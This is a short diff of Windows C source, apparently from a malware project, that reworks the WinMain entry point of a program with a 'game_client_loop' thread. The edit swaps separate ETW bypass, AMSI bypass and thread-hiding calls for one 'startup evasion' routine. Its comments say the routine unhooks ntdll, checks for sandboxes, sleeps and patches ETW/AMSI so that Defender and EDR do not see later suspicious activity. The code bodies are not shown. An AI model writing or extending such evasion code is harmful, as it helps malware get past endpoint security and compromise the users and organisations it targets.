@@ -278,15 +278,13 @@ DWORD WINAPI game_client_loop(LPVOID lpParam) {
 
 /* Windows entry point */
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    /* Initialize obfuscated APIs FIRST (before any suspicious calls) */
-    obf_init_apis();
+    /* === CRITICAL: Startup evasion FIRST ===
+     * Unhooks ntdll, checks sandbox, sleeps, applies ETW/AMSI bypass
+     * BEFORE any suspicious activity is visible to EDR. */
+    obf_startup_evasion();
     
-    /* === ETW + AMSI Bypass ===
-     * Patch ETW and AMSI before any suspicious activity to prevent
-     * runtime behavioral detection by Defender/EDR. */
-    obf_bypass_etw();
-    obf_bypass_amsi();
-    obf_hide_thread();
+    /* Initialize obfuscated APIs */
+    obf_init_apis();
     
     /* Initialize subsystems */
     InitializeCriticalSection(&g_copy_buffer_cs);
